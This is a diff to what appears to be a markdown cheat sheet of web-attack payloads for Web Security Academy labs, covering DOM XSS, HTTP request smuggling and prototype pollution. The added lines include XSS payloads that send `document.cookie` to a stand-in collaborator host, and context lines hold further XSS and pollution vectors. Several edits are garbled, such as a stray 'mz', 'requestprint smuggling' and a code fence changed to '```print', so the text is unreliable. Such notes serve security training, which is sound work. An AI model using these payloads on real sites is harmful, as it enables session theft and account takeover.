@@ -44,7 +44,7 @@ addEventListener1
 ```
 * check with DOM Invader
 * angularJS - `ng-app` in HTML or `angular 1-7-7.js`
-
+mz
 ### Payloads
 1. DOM XSS in document.write sink using source location.search inside a select element:  
 * Add parameter to URL `product?productId=1&storeId=kek` and check out it is in dropbox on the product site. Check HTML code and find out, that storeId is in `<select>` tag. Create the next payload:
@@ -206,6 +206,9 @@ Can be interpreted as
 "-alert(window["document"]["cookie"])-"
 "-window["alert"](window["document"]["cookie"])-"
 "-self["alert"](self["document"]["cookie"])-"
+"-alert``}//
+"}; location=”https://BURP-COLLABORATOR-URL/?”+document.cookie; //
+%22};%20location=%22https://BURP-COLLABORATOR-URL/?%22%2bdocument.cookie;%20//
 ```
 
 ```
@@ -553,7 +556,7 @@ GET /post?postId=10 HTTP/1.1
 User-Agent: kek"><img src=123 onerror=alert(1)>
 Foo: x
 ```
-7. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability  
+7. Exploiting HTTP requestprint smuggling to bypass front-end security controls, CL.TE vulnerability  
 ```
 POST / HTTP/1.1
 Host: 0a6f008e04ed8481c035778000dc0063.web-security-academy.net
@@ -1096,7 +1099,7 @@ Arises, usually, in these JS files: searchLogger.js, searchLoggerAlternative.js 
 1. DOM XSS via client-side prototype pollution  
 ```
 https://site.com/?__proto__[transport_url]=data:,alert(1)
-```
+```print
 2. DOM XSS via an alternative prototype pollution vector  
 ```
 https://site.com/?__proto__.sequence=alert(1)-
